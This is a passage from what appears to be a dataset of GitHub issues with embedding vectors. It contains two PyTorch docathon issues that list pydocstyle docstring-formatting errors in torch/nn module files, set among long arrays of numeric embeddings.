 -0.6159674  -0.2135103  -0.17802775  0.23214266  0.31241375  0.03683662
  0.06998038  0.08345841  0.02907952  0.13105401  0.279014    0.06921242
 -0.54729307 -0.07364031 -0.12637338  0.3064486  -0.10616567  0.2996227
  0.07461818  0.02891285  0.09097105 -0.36742848  0.4300356   0.31940532
 -0.24898496  0.17391998 -0.04837945  0.00356516 -0.08510099  0.45660186
  0.20843758  0.03232764 -0.03057664 -0.37993705 -0.2027348   0.11290984
  0.11461541 -0.04887397 -0.49145615  0.08317959 -0.17320782 -0.25677228
  0.20929292  0.07291589 -0.09994732 -0.16839026 -0.08331574  0.01387264
 -0.2294591   0.19503002 -0.07552084 -0.3194453   0.03615329 -0.23776531
  0.05934814 -0.58206844 -0.06448153 -0.01000714  0.15911162  0.17534278
 -0.51207006 -0.46517852  0.46836478 -0.06082071 -0.35045528 -0.01514563
 -0.0351814   0.42109096 -0.03190289  0.17085186 -0.11841143  0.38387573
 -0.5904418   0.03804117 -0.12023852 -0.23974273 -0.03463084 -0.23237796
 -0.20940208  0.03705319  0.23318005 -0.07492255 -0.3865221   0.18048069
 -0.2163868   0.24316028  0.38090512  0.2522491   0.09552386  0.01365403
  0.00620035 -0.310699   -0.47868726  0.29627264  0.4082792  -0.11512229]"
"Fix docstring errors in container.py, _functions.py, transformer.py, comm.py, parallel_apply.py, data_parallel.py, scatter_gather.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/modules/container.py`, **Entity**: `Sequential`, **Line**: 43, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `_get_item_by_idx`, **Line**: 107, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/modules/container.py`, **Entity**: `append`, **Line**: 221, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `_get_abs_string_index`, **Line**: 282, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/container.py`, **Entity**: `__repr__`, **Line**: 329, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/container.py`, **Entity**: `__repr__`, **Line**: 329, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/nn/modules/container.py`, **Entity**: `append`, **Line**: 378, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `extend`, **Line**: 392, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `clear`, **Line**: 482, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `keys`, **Line**: 498, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `items`, **Line**: 504, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `values`, **Line**: 510, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `update`, **Line**: 515, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `update`, **Line**: 515, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/modules/container.py`, **Entity**: `_get_abs_string_index`, **Line**: 587, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/container.py`, **Entity**: `append`, **Line**: 640, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `extend`, **Line**: 651, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `copy`, **Line**: 770, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `copy`, **Line**: 770, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/container.py`, **Entity**: `setdefault`, **Line**: 780, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/container.py`, **Entity**: `setdefault`, **Line**: 780, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `clear`, **Line**: 794, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `popitem`, **Line**: 810, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `popitem`, **Line**: 810, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/modules/container.py`, **Entity**: `get`, **Line**: 821, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `fromkeys`, **Line**: 831, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/modules/container.py`, **Entity**: `keys`, **Line**: 840, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `items`, **Line**: 845, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `values`, **Line**: 850, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `update`, **Line**: 855, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `update`, **Line**: 855, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `Transformer`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `Transformer`, **Line**: 19, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `forward`, **Line**: 90, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `generate_square_subsequent_mask`, **Line**: 154, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `generate_square_subsequent_mask`, **Line**: 154, **Description**: Docstring is over-indented
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `_reset_parameters`, **Line**: 160, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoder`, **Line**: 168, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoder`, **Line**: 168, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoder`, **Line**: 168, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerDecoder`, **Line**: 346, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerDecoder`, **Line**: 346, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoderLayer`, **Line**: 417, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoderLayer`, **Line**: 417, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerDecoderLayer`, **Line**: 669, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerDecoderLayer`, **Line**: 669, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/comm.py`, **Entity**: `broadcast_coalesced`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/comm.py`, **Entity**: `reduce_add`, **Line**: 62, **Description**: First line should be in imperative mood (perhaps 'Sum', not 'Sums')
- **File**: `torch/nn/parallel/comm.py`, **Entity**: `reduce_add_coalesced`, **Line**: 108, **Description**: First line should be in imperative mood (perhaps 'Sum', not 'Sums')
- **File**: `torch/nn/parallel/_functions.py`, **Entity**: `_get_stream`, **Line**: 115, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/parallel/_functions.py`, **Entity**: `_get_stream`, **Line**: 115, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/nn/parallel/parallel_apply.py`, **Entity**: `parallel_apply`, **Line**: 31, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/parallel_apply.py`, **Entity**: `parallel_apply`, **Line**: 31, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/parallel/parallel_apply.py`, **Entity**: `parallel_apply`, **Line**: 31, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/parallel/scatter_gather.py`, **Entity**: `scatter`, **Line**: 36, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/scatter_gather.py`, **Entity**: `scatter`, **Line**: 36, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/parallel/scatter_gather.py`, **Entity**: `scatter_kwargs`, **Line**: 72, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/parallel/scatter_gather.py`, **Entity**: `gather`, **Line**: 83, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/data_parallel.py`, **Entity**: `data_parallel`, **Line**: 214, **Description**: First line should be in imperative mood (perhaps 'Evaluate', not 'Evaluates')

cc @carljparker",False,"[-0.1957622  -0.29568046 -0.0695238  -0.14724487  0.07887647 -0.08043402
 -0.11352469  0.11960449 -0.4410724   0.08650854 -0.03218675  0.00343915
  0.11421953  0.23338369 -0.00843918  0.04779877 -0.32525855 -0.2788877
  0.17435442  0.08010869  0.13070941  0.44310588 -0.1633959   0.0158755
 -0.10045077  0.08241166 -0.31513178 -0.13369972 -0.0351773   0.11294191
  0.3571571   0.23848975 -0.28445023 -0.01623328  0.41133046  0.193861
 -0.21525216 -0.15020818  0.09292359  0.05814346 -0.17624152 -0.20564614
 -0.09860655 -0.08015192  0.0164663  -0.24079007 -0.27024472  0.27720046
 -0.04682988  0.04381382 -0.14315122  0.00124017 -0.13234186 -0.08659258
  0.25308496 -0.02110918 -0.12142186  0.5390061  -0.01454334 -0.20168078
  0.16488996  0.07894866  0.12351288  0.24194989 -0.16303825  0.25758338
  0.08064538  0.14006057  0.26036456  0.07910761 -0.16553752  0.0418037
 -0.4308925  -0.329239   -0.01610174  0.26926363 -0.4239409  -0.07287519
 -0.34568274 -0.29496646 -0.18599504  0.15583599 -0.04891367  0.07301681
 -0.04748894 -0.17416446  0.1486859   0.00141332  0.25090337  0.0735893
  0.44890934 -0.21461141 -0.1063814   0.39296332  0.07384554  0.25934818
 -0.03757069 -0.13188756  0.1149271  -0.25219893 -0.03385688 -0.2821573
 -0.05923337  0.10699672  0.14054042 -0.03780906  0.08153275 -0.02008903
  0.3861035  -0.00666356  0.0585108  -0.0728296   0.14766365  0.21626362
  0.2711987   0.02355843 -0.08077925 -0.0080994  -0.4139919   0.04983374
  0.15080398  0.20122603 -0.04880065  0.0064685   0.16843984  0.03193245
  0.24298093 -0.01422296  0.10953879 -0.18696591  0.17904505 -0.01965576
  0.00129219  0.0058085   0.30291834  0.14453058 -0.27115113 -0.31906533
 -0.05481331  0.04251833 -0.23035802 -0.39188257 -0.40666467 -0.3816512
  0.33508405  0.43930316 -0.4764805   0.37859297 -0.06529011  0.02647846
  0.09596016  0.07582896 -0.18621008  0.39747873  0.03499057  0.0243341
  0.579278    0.06402193  0.09697101 -0.25596753 -0.08575714  0.2347574
 -0.20194656  0.03440607 -0.19106635  0.10737678 -0.17430325 -0.08172691
 -0.36677313 -0.15334707  0.1390117   0.1772699  -0.06022254 -0.14926499
  0.17129862  0.14087592 -0.16116744 -0.37488514 -0.02796114  0.24100788
 -0.11450021  0.6041688   0.2125868   0.00911933 -0.23706537  0.11192967
  0.27692485  0.01224756  0.20133114  0.36711764 -0.0414956  -0.2837971
  0.15488413 -0.00550576 -0.04259832 -0.06536879  0.34487218  0.5941644
  0.09115396  0.21798101 -0.18704501  0.13567293  0.3725717  -0.06099695
  0.43576103 -0.20754686 -0.32463783 -0.30119416 -0.21923569  0.1488846
 -0.3600322  -0.16210505 -0.08939484 -0.2482762  -0.3724805   0.48755935
  0.11197771 -0.32440782  0.20270313 -0.21428934 -0.3428644  -0.0329856
 -0.11748126 -0.28384438  0.20740338  0.03923179  0.02268638 -0.01253213
 -0.03096754 -0.10998591  0.03618564 -0.20290479  0.46047306 -0.11677559
  0.18041104  0.07884365 -0.05020181  0.06918462  0.14215235  0.26895618
 -0.05192033  0.02044006  0.04198636 -0.00131988  0.25371975 -0.13540027
 -0.18756658 -0.18508059 -0.34489846  0.11984958 -0.24391787 -0.48028284
  0.14745231 -0.17185345  0.7362429  -0.02491775 -0.23322368 -0.08982395
  0.05963013  0.14633416 -0.15218823  0.23436695 -0.00814969  0.15836108
  0.28917837 -0.16224985 -0.19058076  0.15037444 -0.12767285 -0.086289
  0.06908308 -0.4831017   0.39719367  0.13408698  0.3931904   0.08074298
  0.302837    0.05477986  0.06565607  0.07643579 -0.19476317  0.48529375
 -0.35651058 -0.05001929  0.26191458 -0.04297832 -0.11797674 -0.1674462
 -0.438198   -0.02847898 -0.18515977  0.16686442  0.535098   -0.03232878
  0.03209133  0.17571878  0.11162852  0.1591902   0.38650322  0.06940034
 -0.5650167  -0.03229742 -0.02647728  0.22991535  0.01752251  0.2198599
  0.2812481   0.08569836 -0.0376835  -0.4483867   0.42920893  0.29580018
 -0.23688719  0.14683852 -0.06513444  0.13942997  0.05608965  0.5635349
  0.27975202  0.07153681 -0.0902703  -0.4398491  -0.186118   -0.06736649
  0.18313204 -0.2477797  -0.39032724  0.04388517 -0.28984743 -0.4218328
  0.13052388 -0.03782982  0.07870388 -0.15130642  0.05410193 -0.01204715
 -0.16918096  0.17654666 -0.00335002 -0.21745749 -0.18786398 -0.14642823
  0.04770883 -0.45839715 -0.10851783  0.0958894   0.03713698  0.28360137
 -0.43467963 -0.44069237  0.57436585 -0.04450762 -0.45764524 -0.004016
 -0.05202435  0.4455551  -0.05797027  0.16611308 -0.1922843   0.33704764
 -0.5669972  -0.13595806 -0.13356298 -0.25633824  0.03522602 -0.2903397
 -0.20470151  0.00174224  0.10008173 -0.11976109 -0.3340497   0.17869079
  0.04738831  0.3384203   0.35298115  0.07791756  0.12501791  0.03974158
  0.01115048 -0.2272591  -0.50306535  0.45145777  0.5385715  -0.17582512]"
Fix docstring errors in module.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_buffer_registration_hook`, **Line**: 102, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_module_registration_hook`, **Line**: 126, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_parameter_registration_hook`, **Line**: 150, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_forward_pre_hook`, **Line**: 174, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_forward_hook`, **Line**: 206, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_forward_hook`, **Line**: 206, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_backward_hook`, **Line**: 240, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_full_backward_pre_hook`, **Line**: 267, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_full_backward_hook`, **Line**: 304, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_forward_unimplemented`, **Line**: 353, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/nn/modules/module.py`, **Entity**: `__init__`, **Line**: 441, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/modules/module.py`, **Entity**: `__init__`, **Line**: 441, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/module.py`, **Entity**: `__init__`, **Line**: 441, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_buffer`, **Line**: 485, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_parameter`, **Line**: 544, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/modules/module.py`, **Entity**: `add_module`, **Line**: 590, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_submodule`, **Line**: 622, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_submodule`, **Line**: 622, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_submodule`, **Line**: 622, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_parameter`, **Line**: 690, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_parameter`, **Line**: 690, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_parameter`, **Line**: 690, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_buffer`, **Line**: 728, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_buffer`, **Line**: 728, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_buffer`, **Line**: 728, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_extra_state`, **Line**: 765, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_extra_state`, **Line**: 765, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `set_extra_state`, **Line**: 785, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `set_extra_state`, **Line**: 785, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/module.py`, **Entity**: `set_extra_state`, **Line**: 785, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/modules/module.py`, **Entity**: `apply`, **Line**: 853, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `apply`, **Line**: 853, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/modules/module.py`, **Entity**: `apply`, **Line**: 853, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/modules/module.py`, **Entity**: `cuda`, **Line**: 893, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `ipu`, **Line**: 912, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `xpu`, **Line**: 931, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `cpu`, **Line**: 950, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `to_empty`, **Line**: 1019, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `to`, **Line**: 1044, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/module.py`, **Entity**: `to`, **Line**: 1044, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_full_backward_pre_hook`, **Line**: 1156, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_backward_hook`, **Line**: 1203, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_full_backward_hook`, **Line**: 1229, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_get_backward_hooks`, **Line**: 1285, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_get_backward_hooks`, **Line**: 1285, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_forward_pre_hook`, **Line**: 1363, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_forward_hook`, **Line**: 1427, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_state_dict_hook`, **Line**: 1704, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_state_dict_hook`, **Line**: 1704, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_state_dict_hook`, **Line**: 1704, **Description**: First line should be in imperative mood; try rephrasing (found 'These')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_state_dict_pre_hook`, **Line**: 1715, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_state_dict_pre_hook`, **Line**: 1715, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_state_dict_pre_hook`, **Line**: 1715, **Description**: First line should be in imperative mood; try rephrasing (found 'These')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_save_to_state_dict`, **Line**: 1725, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_save_to_state_dict`, **Line**: 1725, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_save_to_state_dict`, **Line**: 1725, **Description**: First line should be in imperative mood (perhaps 'Save', not 'Saves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `state_dict`, **Line**: 1762, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/module.py`, **Entity**: `state_dict`, **Line**: 1762, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_load_state_dict_pre_hook`, **Line**: 1841, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_load_state_dict_pre_hook`, **Line**: 1841, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_load_state_dict_pre_hook`, **Line**: 1841, **Description**: First line should be in imperative mood; try rephrasing (found 'These')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_load_state_dict_post_hook`, **Line**: 1860, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_load_state_dict_post_hook`, **Line**: 1860, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_load_state_dict_post_hook`, **Line**: 1860, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_load_from_state_dict`, **Line**: 1892, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_load_from_state_dict`, **Line**: 1892, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_load_from_state_dict`, **Line**: 1892, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/nn/modules/module.py`, **Entity**: `load_state_dict`, **Line**: 1998, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `load_state_dict`, **Line**: 1998, **Description**: First line should end with a period (not 'o')
- **File**: `torch/nn/modules/module.py`, **Entity**: `load_state_dict`, **Line**: 1998, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_named_members`, **Line**: 2086, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/nn/modules/module.py`, **Entity**: `parameters`, **Line**: 2100, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_parameters`, **Line**: 2130, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_parameters`, **Line**: 2130, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_parameters`, **Line**: 2130, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `buffers`, **Line**: 2158, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_buffers`, **Line**: 2181, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_buffers`, **Line**: 2181, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_buffers`, **Line**: 2181, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `children`, **Line**: 2208, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_children`, **Line**: 2217, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_children`, **Line**: 2217, **Description**: First line should end with a period (not 'h')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_children`, **Line**: 2217, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `modules`, **Line**: 2238, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_modules`, **Line**: 2265, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_modules`, **Line**: 2265, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_modules`, **Line**: 2265, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_modules`, **Line**: 2265, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `train`, **Line**: 2309, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/modules/module.py`, **Entity**: `eval`, **Line**: 2331, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/modules/module.py`, **Entity**: `requires_grad_`, **Line**: 2349, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `requires_grad_`, **Line**: 2349, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/module.py`, **Entity**: `zero_grad`, **Line**: 2373, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `zero_grad`, **Line**: 2373, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/module.py`, **Entity**: `zero_grad`, **Line**: 2373, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/nn/modules/module.py`, **Entity**: `share_memory`, **Line**: 2399, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/module.py`, **Entity**: `extra_repr`, **Line**: 2406, **Description**: First line should end with a period (not 'e')

cc @carljparker",False,"[-0.16114469 -0.2499094  -0.10072887 -0.07545941  0.03848505 -0.18133315
 -0.07315919  0.18914416 -0.3569222   0.11202286  0.0734885  -0.0678077
  0.03161847  0.13136694 -0.00096808  0.07701816 -0.31975964 -0.43526688
  0.10639034  0.06980874  0.01556087  0.4934507  -0.0791139   0.13688818
 -0.03417337  0.04947399 -0.43091094 -0.18105648  0.12187029  0.1971358
  0.26541695  0.09246683 -0.3669609   0.1102446   0.44014263  0.38441953
 -0.24926332 -0.1269198  -0.01001145  0.03827379  0.03168706 -0.22610965
 -0.08102036  0.01200268  0.11114552 -0.21363676 -0.24789825  0.31335258
 -0.03817786  0.15823564 -0.09581164  0.0597854  -0.1718418   0.01749499
  0.23651737 -0.02990388 -0.0631084   0.5868821   0.09920953 -0.07420079
  0.12417168  0.14216074 -0.09026711  0.02027909 -0.12989858  0.20527871
  0.0079103   0.17497958  0.32756275  0.1593025  -0.18094707  0.06498682
 -0.3293134  -0.2606199  -0.0737676   0.30221978 -0.3599121  -0.01384948
